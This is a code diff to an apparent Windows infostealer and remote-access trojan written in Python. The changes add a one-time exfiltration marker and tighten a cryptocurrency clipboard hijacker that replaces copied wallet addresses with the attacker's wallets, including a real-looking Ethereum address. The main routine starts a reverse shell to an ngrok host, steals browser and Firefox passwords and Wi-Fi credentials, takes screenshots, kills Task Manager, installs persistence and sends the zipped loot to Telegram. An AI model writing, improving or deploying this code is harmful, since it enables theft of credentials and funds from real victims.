@@ -34,8 +34,18 @@ BOT_TOKEN = "<<BOT_TOKEN>>"
 CHAT_ID = "<<CHAT_ID>>"
 NGROK_HOST = "4.tcp.eu.ngrok.io"
 NGROK_PORT = 17534
-EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")  # Hidden folder
-ARCHIVE_NAME = "exfil_data.zip"
+EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")
+EXE_NAME = "system_service.exe"
+EXE_PATH = os.path.join(EXTRACT_FOLDER, EXE_NAME)
+EXFIL_MARKER = os.path.join(EXTRACT_FOLDER, ".exfil_done")
+
+# === MARKERS ===
+def already_exfiltrated():
+    return os.path.exists(EXFIL_MARKER)
+
+def mark_exfiltrated():
+    with open(EXFIL_MARKER, "w") as f:
+        f.write("done")
 
 # === SYSTEM PROFILE ===
 def profile_system():
@@ -250,13 +260,13 @@ def steal_firefox_passwords():
             print(f"[!] Firefox decrypt error: {e}")
 
 # === CLIPPER ===
-def clipper_loop():
-    while True:
-        clipper()
-        time.sleep(1.5)
-
 CLIP_WALLETS = {
-    "BTC": "bc1xxx", "ETH": "0x9e6b499df50c4d9fe9b1622b2c2a17e156c9963e", "XRP": "rxyz", "LTC": "ltc1xyz", "BCH": "qxyxyxy", "XMR": "4xxxxx"
+    "BTC": "bc1xxx",
+    "ETH": "0x9e6b499df50c4d9fe9b1622b2c2a17e156c9963e",
+    "XRP": "rxyz",
+    "LTC": "ltc1xyz",
+    "BCH": "qxyxyxy",
+    "XMR": "4xxxxx"
 }
 CLIP_PATTERNS = {
     "BTC": r"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}",
@@ -266,18 +276,27 @@ CLIP_PATTERNS = {
     "BCH": r"(bitcoincash:)?(q|p)[a-z0-9]{41}",
     "XMR": r"4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}"
 }
+
 def clipper():
     try:
         win32clipboard.OpenClipboard()
         data = win32clipboard.GetClipboardData()
         win32clipboard.CloseClipboard()
+
         for coin, pattern in CLIP_PATTERNS.items():
-            if re.search(pattern, data):
+            if re.fullmatch(pattern, data.strip()):
                 win32clipboard.OpenClipboard()
                 win32clipboard.EmptyClipboard()
                 win32clipboard.SetClipboardText(CLIP_WALLETS[coin])
                 win32clipboard.CloseClipboard()
-    except: pass
+                break
+    except:
+        pass
+
+def clipper_loop():
+    while True:
+        clipper()
+        time.sleep(1.5)
     
 import datetime
 
@@ -533,18 +552,21 @@ def run():
     launch_distraction_app()
     threading.Thread(target=clipper_loop, daemon=True).start()
     threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
-    profile_system()
-    take_screenshot()
-    if check_webcam():
-        with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
-            f.write("Webcam detected.")
-    extract_wifi()
-    detect_vm()
-    kill_taskmgr()
-    clipper()
-    steal_browser()
-    steal_firefox_passwords()
-    send_zip_to_telegram()
+
+    if not already_exfiltrated():
+        profile_system()
+        take_screenshot()
+        if check_webcam():
+            with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
+                f.write("Webcam detected.")
+        extract_wifi()
+        detect_vm()
+        kill_taskmgr()
+        clipper()
+        steal_browser()
+        steal_firefox_passwords()
+        send_zip_to_telegram()
+        mark_exfiltrated()
     persist()
     fake_input()
     while True:
